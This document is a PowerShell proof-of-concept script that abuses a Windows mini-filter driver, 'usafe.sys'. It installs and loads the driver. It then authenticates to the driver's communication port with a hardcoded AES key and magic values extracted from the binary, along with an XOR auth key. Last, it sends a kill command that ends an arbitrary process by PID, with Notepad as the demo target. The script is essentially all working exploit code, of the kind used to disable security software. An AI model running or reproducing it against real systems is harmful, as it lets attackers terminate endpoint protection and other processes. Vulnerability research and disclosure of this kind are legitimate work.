Clear-Host
Write-Host

$DriverName = "usafe"
$DriverPath = Join-Path $PSScriptRoot "usafe.sys"

if (-not (Test-Path $DriverPath)) {
    Write-Error "Driver file not found at: $DriverPath"
    return
}

# 1. Create the Service using sc.exe
Write-Host "Creating driver service..."
& sc.exe create $DriverName binPath= $DriverPath type= filesys start= demand 2>&1 | Out-Null

# 2. Add Mini-Filter Registry Keys (Required for Filter Manager attachment)
Write-Host "Configuring mini-filter registry keys..."
$ServiceRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$DriverName"
$InstancesPath  = "$ServiceRegPath\Instances"
$InstanceName   = "USafe Instance"
$InstancePath   = "$InstancesPath\$InstanceName"

if (-not (Test-Path $InstancesPath)) {
    New-Item -Path $InstancesPath -Force | Out-Null
}
Set-ItemProperty -Path $InstancesPath -Name "DefaultInstance" -Value $InstanceName

if (-not (Test-Path $InstancePath)) {
    New-Item -Path $InstancePath -Force | Out-Null
}
Set-ItemProperty -Path $InstancePath -Name "Altitude" -Value "370000"
Set-ItemProperty -Path $InstancePath -Name "Flags" -Value 0

# 3. Load the Driver via fltMC
Write-Host "Loading mini-filter driver..."
& fltMC load $DriverName
if ($LASTEXITCODE -ne 0) {
    Write-Error "Failed to load driver via fltMC."
    return
}
Write-Host "Driver loaded successfully." -ForegroundColor Green

# ============================================================
# AES-256 ECB Encryption (hardcoded key from usafe.sys .rdata)
# ============================================================
$AesKey = [byte[]]@(
    0x55,0x4F,0x76,0x26,0x4E,0x6F,0x41,0x26,
    0x43,0x26,0x4F,0x6B,0x57,0x52,0x68,0x25,
    0x45,0x7A,0x70,0x34,0x4F,0x67,0x52,0x58,
    0x5F,0x6B,0x65,0x24,0x52,0x34,0x51,0x48
)

function Encrypt-AesEcb([byte[]]$Plaintext) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key     = $AesKey
    $aes.Mode    = [System.Security.Cryptography.CipherMode]::ECB
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $enc = $aes.CreateEncryptor()
    $result = $enc.TransformFinalBlock($Plaintext, 0, $Plaintext.Length)
    $enc.Dispose()
    $aes.Dispose()
    return $result
}

function Send-USafeCommand([IntPtr]$hPort, [byte[]]$PlaintextCmd, [int]$OutSize = 0) {
    $encrypted = Encrypt-AesEcb $PlaintextCmd
    $inSize    = $encrypted.Length
    $InPtr     = [Marshal]::AllocHGlobal($inSize)
    [Marshal]::Copy($encrypted, 0, $InPtr, $inSize)

    $OutPtr = [IntPtr]::Zero
    if ($OutSize -gt 0) {
        $OutPtr = [Marshal]::AllocHGlobal($OutSize)
    }

    $bytesRet = 0
    $Values = $hPort, $InPtr, $inSize, $OutPtr, $OutSize, [Ref]$bytesRet
    $hr = Invoke-UnmanagedMethod -Dll FltLib.dll -Function FilterSendMessage -Values $Values

    [Marshal]::FreeHGlobal($InPtr)

    if ($OutPtr -ne [IntPtr]::Zero) {
        $outData = New-Object byte[] $OutSize
        [Marshal]::Copy($OutPtr, $outData, 0, $OutSize)
        [Marshal]::FreeHGlobal($OutPtr)
        return @{ HR = $hr; Data = $outData; BytesReturned = $bytesRet }
    }
    return @{ HR = $hr; BytesReturned = $bytesRet }
}

# 4. Connect to Communication Port
$PortName = '\{39341D19-B97D-4969-ADCE-4C7E934FDF49}'
Write-Host "Connecting to port: $PortName"
$Values = $PortName, 0, 0L, 0, 0L, [Ref]0L
$hr = Invoke-UnmanagedMethod -Dll FltLib.dll -Function FilterConnectCommunicationPort -Values $Values
if ($hr -ne 0) {
    Write-Error ("FilterConnectCommunicationPort failed: 0x{0:X8}" -f $hr)
    return
}
$hPort = $Values[5].Value
Write-Host "Connected. Handle: $hPort" -ForegroundColor Green

# 5. Send UHLO Handshake (0x55484C4F) - 36 bytes
#    ALL fields must match hardcoded magic values or driver sets state=4 (reject)
#    Only when all match does it set dword_B080=3 (Activate will accept)
Write-Host "Sending UHLO handshake..."
$uhlo = New-Object byte[] 36                              # 0x24 bytes total
[System.BitConverter]::GetBytes([uint32]0x55484C4F).CopyTo($uhlo, 0)   # +00: command = UHLO
[System.BitConverter]::GetBytes([uint32]0x55465345).CopyTo($uhlo, 4)   # +04: magic "ESFU"
[System.BitConverter]::GetBytes([uint32]0x00000007).CopyTo($uhlo, 8)   # +08: version = 7
[System.BitConverter]::GetBytes([uint32]0x20260824).CopyTo($uhlo, 12)  # +0C: date 2026-08-24
[System.BitConverter]::GetBytes([uint32]0x00000002).CopyTo($uhlo, 16)  # +10: type = 2
[System.BitConverter]::GetBytes([uint32]0x0000006F).CopyTo($uhlo, 20)  # +14: 0x6F = 111
([byte[]](0x01,0xEA,0x9E,0xC2)).CopyTo($uhlo, 24)                      # +18: checksum 0xC29EEA01 (LE)
[System.BitConverter]::GetBytes([uint64]0x4141414141414141).CopyTo($uhlo, 28) # +1C: session token (any)
$result = Send-USafeCommand $hPort $uhlo 48               # response is 0x2C (44) bytes
Write-Host ("  UHLO result: 0x{0:X8}" -f $result.HR)

# 6. Send Activate (0x7576) with XOR auth key "efasUUuu"
Write-Host "Sending Activate with XOR auth..."
$activate = New-Object byte[] 12
[System.BitConverter]::GetBytes([uint32]0x00007576).CopyTo($activate, 0)  # command
[System.BitConverter]::GetBytes([uint64]0x7575555573616665).CopyTo($activate, 4)  # "efasUUuu"
$result = Send-USafeCommand $hPort $activate 16
Write-Host ("  Activate result: 0x{0:X8}" -f $result.HR)

# 7. Kill target process (0x757B) - launch notepad as demo target
$PROCID  = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru | Select-Object -ExpandProperty Id
Write-Host "Target PID: $PROCID"
Start-Sleep -Seconds 1

Write-Host "Sending Kill command (0x757B)..."
$kill = New-Object byte[] 12
[System.BitConverter]::GetBytes([uint32]0x0000757B).CopyTo($kill, 0)  # kill sub-command
[System.BitConverter]::GetBytes([uint32]$PROCID).CopyTo($kill, 4)     # target PID
[System.BitConverter]::GetBytes([uint32]1).CopyTo($kill, 8)           # exit code
$result = Send-USafeCommand $hPort $kill 0
Write-Host ("  Kill result: 0x{0:X8}" -f $result.HR) -ForegroundColor Yellow

# 8. Cleanup
Write-Host "Unloading driver and removing registry keys..." -ForegroundColor Cyan
Free-IntPtr $hPort -Method NtHandle
& fltMC.exe unload $DriverName
& sc.exe delete $DriverName

if (Test-Path $ServiceRegPath) {
    Remove-Item -Path $ServiceRegPath -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host "Cleanup completed successfully." -ForegroundColor Green